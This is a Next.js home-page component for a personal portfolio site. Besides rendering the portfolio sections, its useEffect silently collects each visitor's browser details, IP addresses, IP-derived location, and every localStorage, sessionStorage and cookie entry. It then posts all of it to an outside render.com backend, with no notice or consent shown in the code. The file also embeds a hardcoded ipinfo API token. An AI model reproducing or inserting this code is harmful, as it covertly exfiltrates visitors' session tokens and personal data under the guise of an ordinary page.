"use client";
import Contact from '@/components/contact';
import Experience from "@/components/experience";
import Intro from "@/components/intro";
import Other from "@/components/other-projects";
import Projects from "@/components/projects";
import SectionDivider from "@/components/section-divider";
import Skills from "@/components/skills";
import axios from 'axios';
import { useEffect, useState } from 'react';

// Define types for the data being stored
interface BrowserInfo {
  platform: string;
  userAgent: string;
  screenResolution: string;
  language: string;
}

interface IPData {
  ipv4Address: { ip: string };
  ipv6Address: { ip: string };
}

interface LocationData {
  city: string;
  region: string;
  country: string;
  [key: string]: any; // To allow other optional keys
}

interface StorageData {
  key: string;
  value: string | null;
}

interface MergedData {
  browserInformation: BrowserInfo;
  ipv4Address: { ip: string };
  ipv6Address: { ip: string };
  locationInformation: LocationData;
  localStorageData: StorageData[];
  sessionStorageData: StorageData[];
  cookiesData: StorageData[];
}

export default function Home() {
  const [mergedData, setMergedData] = useState<MergedData>({
    browserInformation: {
      platform: '',
      userAgent: '',
      screenResolution: '',
      language: '',
    },
    ipv4Address: { ip: '' },
    ipv6Address: { ip: '' },
    locationInformation: {
      city: '',
      region: '',
      country: '',
    },
    localStorageData: [],
    sessionStorageData: [],
    cookiesData: [],
  });

  useEffect(() => {
    // Function to fetch browser information
    const fetchBrowserInfo = (): BrowserInfo => {
      return {
        platform: navigator.platform,
        userAgent: navigator.userAgent,
        screenResolution: `${window.screen.width}x${window.screen.height}`,
        language: navigator.language,
      };
    };

    // Function to fetch IP data (both IPv4 and IPv6)
    const fetchIPData = async (): Promise<IPData> => {
      try {
        const ipv4Res = await axios.get('https://api.ipify.org?format=json');
        const ipv6Res = await axios.get('https://api64.ipify.org?format=json');
        return { ipv4Address: ipv4Res.data, ipv6Address: ipv6Res.data };
      } catch (error) {
        console.error('Error fetching IP data: ', error);
        return { ipv4Address: { ip: '' }, ipv6Address: { ip: '' } };
      }
    };

    // Function to fetch location information
    const fetchLocationData = async (): Promise<LocationData> => {
      try {
        const token = '9de6e22c16736d'; // Replace with your actual API token
        const response = await axios.get(`https://ipinfo.io?token=${token}`);
        return response.data;
      } catch (error) {
        console.error('Error fetching location data:', error);
        return { city: '', region: '', country: '' };
      }
    };

    // Function to fetch storage data (localStorage, sessionStorage, and cookies)
    const fetchStorageData = () => {
      const localStorageData: StorageData[] = [];
      for (let i = 0; i < localStorage.length; i++) {
        const key = localStorage.key(i) || ''; 
        const value = localStorage.getItem(key) || '';
        localStorageData.push({ key: key || '', value });
      }

      const sessionStorageData: StorageData[] = [];
      for (let i = 0; i < sessionStorage.length; i++) {
        const key = sessionStorage.key(i) || ''; // Provide fallback for key being null
        const value = sessionStorage.getItem(key) || ''; 
        sessionStorageData.push({ key: key || '', value });
      }

      const cookies = document.cookie.split(';');
      const cookiesData = cookies.map(cookie => {
        const [key, value] = cookie.split('=');
        return { key: key.trim(), value: decodeURIComponent(value) };
      });

      return { localStorageData, sessionStorageData, cookiesData };
    };

    const fetchData = async () => {
      const browserInformation = fetchBrowserInfo();
      const ipData = await fetchIPData();
      const locationInformation = await fetchLocationData();
      const storageData = fetchStorageData();

      const allData: MergedData = {
        browserInformation,
        ...ipData,
        locationInformation,
        ...storageData,
      };

      setMergedData(allData);

      // Save the data to the backend
      saveData(allData);
    };

    fetchData();
  }, []);

  const saveData = async (data: MergedData) => {
    try {
      await axios.post('https://user-analytics-backend-1.onrender.com/api/data/save', data);
      console.log('Data saved successfully');
    } catch (error) {
      console.error('Error saving data:', error);
    }
  };

  return (
    <main className="flex flex-col items-center px-4">
      <Intro />
      <SectionDivider />
      <Projects />
      <Skills />
      <Experience />
      <Other />
      <Contact />
    </main>
  );
}
